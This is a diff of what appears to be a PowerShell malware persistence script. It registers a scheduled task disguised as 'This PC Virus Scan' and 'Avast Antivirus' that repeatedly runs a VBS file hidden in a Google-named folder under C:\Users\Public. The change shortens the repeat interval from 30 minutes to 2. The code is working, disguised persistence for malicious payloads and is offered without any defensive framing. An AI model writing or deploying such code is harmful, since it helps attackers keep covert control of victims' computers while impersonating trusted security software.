@@ -14,10 +14,10 @@ if(!(Test-Path "$location\count.txt")) {
 
 
      try { 
-	  schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "This PC Virus Scan" /TR 'wscript.exe ""C:\Users\Public\Google\Google-main\b323log.vbs""' /ST 00:00 /RI 30 /DU 24:00 | Out-Null
+	  schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "This PC Virus Scan" /TR 'wscript.exe ""C:\Users\Public\Google\Google-main\b323log.vbs""' /ST 00:00 /RI 2 /DU 24:00 | Out-Null
      }
      catch { 
-	    $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("30")) -RepeatIndefinitely
+	    $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("2")) -RepeatIndefinitely
             $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '"C:\Users\Public\Google\Google-main\b323log.vbs"'
             Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "This PC Virus Scan" -Description "Avast Antivirus" -Force		
 	   }
